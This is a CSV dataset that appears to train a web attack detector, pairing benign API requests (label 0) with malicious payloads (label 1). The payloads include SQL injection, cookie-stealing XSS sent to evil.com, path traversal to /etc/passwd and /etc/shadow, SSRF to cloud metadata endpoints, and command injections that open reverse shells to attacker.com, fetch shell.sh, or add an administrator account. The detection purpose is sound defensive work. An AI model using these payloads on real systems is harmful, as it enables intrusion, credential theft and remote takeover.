"text","label"
"POST /api/login User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"status=pending&priority=high","0"
"order_id=ORD-3212 status=confirmed","0"
"name=Sara email=749@mail.com","0"
"Authorization: Bearer validtoken855","0"
"title=<script >alert(1)</script >","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"DELETE /api/products User-Agent: PostmanRuntime/7.36.0","0"
"category=phones page=4","0"
"GET /.git/config HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"path=../../../var/www/html/config.php","1"
"GET /settings/7561","0"
"ping=& ipconfig","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"user=' UNION ALL SELECT NULL,NULL,NULL--","1"
"GET /dashboard/2300","0"
"POST /profile body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"POST /api/login username=' OR '1'='1'-- password=test","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"cmd=$(curl -s http://attacker.com/shell.sh)","1"
"comment=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"url=http://localhost:8080","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=ORD-6150 status=confirmed","0"
"DELETE /settings?user=ahmed&filter=active","0"
"PUT /settings?id=123&format=json","0"
"GET /api/search?q=javascript:alert(1)","1"
"user_id=713&action=view","0"
"name=Ahmed email=533@mail.com","0"
"DELETE /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"Authorization: Bearer validtoken574","0"
"|| nc -e /bin/sh attacker.com 4444","1"
"ping=& ipconfig","1"
"exec=; python -c 'import socket,subprocess'","1"
"url=http://metadata.google.internal","1"
"order_id=ORD-3222 status=confirmed","0"
"order_id=ORD-1102 status=confirmed","0"
"search=headphones","0"
"Authorization: Bearer validtoken436","0"
"GET /api/products/834","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"GET /web.config HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/files?name=../../../etc/shadow","1"
"order_id=1'/**/OR/**/1=1--","1"
"order_id=ORD-2932 status=confirmed","0"
"page=41&limit=20","0"
"GET /health HTTP/1.1","0"
"username=' OR 'x'='x","1"
"GET ../../../etc/shadow","1"
"GET /profile?status=pending&priority=high","0"
"POST /settings body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"user=ahmed&filter=active","0"
"url=http://metadata.google.internal","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"search=<iframe src=javascript:alert(1)>","1"
"GET /api/data/7150","0"
"username=' OR 1=1#","1"
"user=ahmed&filter=active","0"
"search=<img src=`javascript:alert(1)`>","1"
"category=audio page=4","0"
"status=pending&priority=high","0"
"url=gopher://127.0.0.1:25/","1"
"order_id=ORD-1132 status=confirmed","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"password spray attack detected multiple users","1"
"fetch=http://internal-service:8080/secret","1"
"multiple failed login attempts detected for admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-9813 status=confirmed","0"
"ping=|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"url=http://localhost:8080","1"
"path=file:///etc/passwd","1"
"GET /health HTTP/1.1","0"
"GET /api/users?id=1'%09OR%091=1--","1"
"category=audio page=8","0"
"page=1&limit=10","0"
"category=phones page=6","0"
"message=<svg onload=alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/users?id=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"username=user&password=batman","1"
"GET /profile?search=laptop&sort=price","0"
"id=123&format=json","0"
"GET /.env HTTP/1.1","1"
"POST /api/orders body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"username=administrator&password=admin","1"
"status=pending&priority=high","0"
"GET /phpmyadmin HTTP/1.1","1"
"GET /api/files?name=....//....//etc/passwd","1"
"POST /settings?search=laptop&sort=price","0"
"url=http://10.0.0.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"brute force attempt on login endpoint from single ip","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=ORD-7975 status=confirmed","0"
"filename=| cat /etc/passwd","1"
"POST /api/search body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"page=27&limit=50","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"search=laptop","0"
"category=laptops page=1","0"
"category=electronics&page=1","0"
"message=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"order_id=id=1&id=2 UNION SELECT 1,2--","1"
"page=12&limit=10","0"
"GET /console HTTP/1.1","1"
"fetch=http://internal-service:8080/secret","1"
"page=41&limit=20","0"
"id=1' OR '1'='1' /*","1"
"multiple failed login attempts detected for admin","1"
"date=2024-01-15&type=order","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"order_id=ORD-6649 status=confirmed","0"
"POST /profile body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /backup.sql HTTP/1.1","1"
"POST /api/login username=1 OR 1=1 password=test","1"
"PUT /api/orders User-Agent: python-requests/2.31.0","0"
"url=gopher://127.0.0.1:25/","1"
"url=http://127.0.0.1/admin","1"
"Authorization: Bearer validtoken421","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"host=$(whoami)","1"
"' UNION SELECT NULL--","1"
"GET /api/login?status=pending&priority=high","0"
"name=Omar email=453@mail.com","0"
"search=tablet","0"
"GET ../../../../etc/shadow","1"
"DELETE /dashboard User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /api/orders User-Agent: axios/1.6.0","0"
"POST /api/users?search=laptop&sort=price","0"
"name=Nour email=942@mail.com","0"
"url=http://127.0.0.1/admin","1"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /config.php HTTP/1.1","1"
"id=' OR 'x'='x","1"
"search=' OR 1=1--","1"
"PUT /profile User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"order_id=ORD-2641 status=confirmed","0"
"Authorization: Bearer validtoken235","0"
"username=administrator&password=monkey","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"description=<script>alert(1)</script>","1"
"id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"page=19&limit=10","0"
"filename=; ping -c 4 attacker.com","1"
"GET /api/files?name=../../../var/www/html/config.php","1"
"GET /health HTTP/1.1","0"
"user_id=278&action=view","0"
"url=dict://127.0.0.1:11211/","1"
"search=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"fetch=http://internal-service:8080/secret","1"
"search='; UPDATE users SET password='hacked' WHERE 1=1--","1"
"GET /api/swagger.json HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"order_id=ORD-9836 status=confirmed","0"
"username=' OR 1=1#","1"
"url=http://192.168.1.1","1"
"category=audio page=3","0"
"GET /health HTTP/1.1","0"
"category=tablets page=7","0"
"fetch=http://internal-service:8080/secret","1"
"GET /health HTTP/1.1","0"
"PUT /api/orders?id=123&format=json","0"
"multiple failed login attempts detected for admin","1"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"POST /api/data body=command; cat /etc/shadow","1"
"user=ahmed&filter=active","0"
"Authorization: Bearer validtoken493","0"
"User-Agent: masscan/1.3","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"PUT /api/login?limit=20&offset=0","0"
"page=24&limit=20","0"
"cmd=; cat /etc/shadow","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=1 UNION SELECT user(),database()--","1"
"<script>alert(1)</script>","1"
"order_id=ORD-2505 status=confirmed","0"
"<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"GET /profile/7985","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /health HTTP/1.1","0"
"DELETE /dashboard User-Agent: python-requests/2.31.0","0"
"GET ../../.git/config","1"
"url=http://10.0.0.1","1"
"POST /api/data body=command; python -c 'import socket,subprocess'","1"
"url=http://192.168.1.1","1"
"GET file:///etc/passwd","1"
"page=23&limit=10","0"
"file=file:///etc/passwd","1"
"name=Lina email=460@mail.com","0"
"Authorization: Bearer validtoken993","0"
"message=';alert(String.fromCharCode(88,83,83))//","1"
"url=dict://127.0.0.1:11211/","1"
"order_id=ORD-7931 status=confirmed","0"
"url=dict://127.0.0.1:11211/","1"
"order_id=ORD-1694 status=confirmed","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /health HTTP/1.1","0"
"search=<ScRiPt>alert(1)</ScRiPt>","1"
"GET ../../../../etc/shadow","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=gopher://127.0.0.1:25/","1"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"exec=; ls -la","1"
"order_id=ORD-3424 status=confirmed","0"
"file=../../../../etc/passwd","1"
"search=<script>alert(1)</script>","1"
"search=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"exec=| uname -a","1"
"ping=`id`","1"
"GET /profile/7004","0"
"multiple failed login attempts detected for admin","1"
"user=ahmed&filter=active","0"
"username=administrator&password=monkey","1"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/users?id=1' OR '1'='1' /*","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://10.0.0.1","1"
"GET /phpmyadmin HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"comment=<a href='javascript:alert(1)'>click</a>","1"
"page=43&limit=50","0"
"fetch=http://internal-service:8080/secret","1"
"order_id=ORD-1521 status=confirmed","0"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /health HTTP/1.1","0"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"fetch=http://internal-service:8080/secret","1"
"username=' UNION SELECT NULL--","1"
"page=33&limit=50","0"
"GET /backup.sql HTTP/1.1","1"
"title=javascript:alert(1)","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"Authorization: Bearer validtoken982","0"
"comment=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"comment=""><script>alert(1)</script>","1"
"GET /api/search/1612","0"
"category=laptops page=2","0"
"GET /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"user_id=157&action=view","0"
"php://filter/convert.base64-encode/resource=config.php","1"
"admin'#","1"
"GET /api/swagger.json HTTP/1.1","1"
"comment=javascript:alert(document.cookie)","1"
"search=1 UNION SELECT @@version,NULL--","1"
"name=<iframe src=javascript:alert(1)>","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/products body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /api/orders body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /api/products body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"username=1 OR 1=1","1"
"User-Agent: masscan/1.3","1"
"GET /console HTTP/1.1","1"
"ping=; ping -c 4 attacker.com","1"
"search=laptop","0"
"Authorization: Bearer validtoken797","0"
"Authorization: Bearer validtoken349","0"
"username=user&password=abc123","1"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"& whoami","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/data/224","0"
"POST /api/feedback body=javascript:alert(1)","1"
"url=file:///etc/passwd","1"
"category=phones page=1","0"
"POST /api/feedback body=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://metadata.google.internal","1"
"POST /settings body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"cmd=$(curl -s http://attacker.com/shell.sh)","1"
"Authorization: Bearer validtoken208","0"
"search=' OR 1=1--","1"
"date=2024-01-15&type=order","0"
"order_id=ORD-1097 status=confirmed","0"
"POST /api/data body=command`id`","1"
"GET ../../../../var/log/apache2/access.log","1"
"Authorization: Bearer validtoken148","0"
"name=Omar email=430@mail.com","0"
"url=http://127.0.0.1/admin","1"
"GET /api/search/6749","0"
"order_id=ORD-6850 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search?q=<script>alert(document.cookie)</script>","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"url=http://127.0.0.1/admin","1"
"POST /api/users body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"PUT /api/products User-Agent: axios/1.6.0","0"
"name=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"Authorization: Bearer validtoken290","0"
"multiple failed login attempts detected for admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Sara email=633@mail.com","0"
"host=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"file=/etc/passwd%00","1"
"login attempt failed username admin invalid credentials","1"
"GET /api/files?name=../../../../proc/self/environ","1"
"name=Omar email=992@mail.com","0"
"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"GET file:///etc/passwd","1"
"user_id=487&action=view","0"
"POST /api/feedback body=<body onload=alert(1)>","1"
"url=file:///etc/passwd","1"
"GET /api/users?id='; DELETE FROM orders WHERE 1=1--","1"
"file=....//....//etc/passwd","1"
"name=Sara email=851@mail.com","0"
"name=Omar email=983@mail.com","0"
"GET /api/files?name=../../../.env","1"
"PUT /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"DELETE /settings?id=123&format=json","0"
"user=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"search=laptop&sort=price","0"
"url=http://127.0.0.1/admin","1"
"POST /api/users?status=pending&priority=high","0"
"PUT /api/products?search=laptop&sort=price","0"
"url=http://metadata.google.internal","1"
"GET /admin HTTP/1.1","1"
"GET /api/users?id='; DELETE FROM orders WHERE 1=1--","1"
"User-Agent: Nikto/2.5.0","1"
"page=35&limit=10","0"
"Authorization: Bearer validtoken427","0"
"url=http://192.168.1.1","1"
"GET ../../../../var/log/apache2/access.log","1"
"cmd=$(whoami)","1"
"repeated authentication failure admin account locked","1"
"GET /api/products?id=123&format=json","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /health HTTP/1.1","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=735&action=view","0"
"Authorization: Bearer validtoken116","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user=' UNION SELECT NULL--","1"
"DELETE /api/users?user=ahmed&filter=active","0"
"category=audio page=1","0"
"title=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"message=<input onfocus=alert(1) autofocus>","1"
"url=http://10.0.0.1","1"
"comment=<div onmouseover=alert(1)>hover</div>","1"
"search=headphones","0"
"GET /dashboard/5375","0"
"host=& net user hacker Password1 /add","1"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /server-status HTTP/1.1","1"
"search=laptop&sort=price","0"
"url=http://metadata.google.internal","1"
"order_id=ORD-7718 status=confirmed","0"
"username=admin&password=123456","1"
"user_id=524&action=view","0"
"GET /api/search/6866","0"
"POST /api/search body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://localhost:8080","1"
"file=../../.git/config","1"
"GET /api/users/3291","0"
"User-Agent: Nikto/2.5.0","1"
"url=http://192.168.1.1","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"username=user&password=qwerty","1"
"<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"search=1'; EXEC xp_cmdshell('whoami')--","1"
"<div onmouseover=alert(1)>hover</div>","1"
"ping=; python -c 'import socket,subprocess'","1"
"category=phones page=9","0"
"username=root&password=abc123","1"
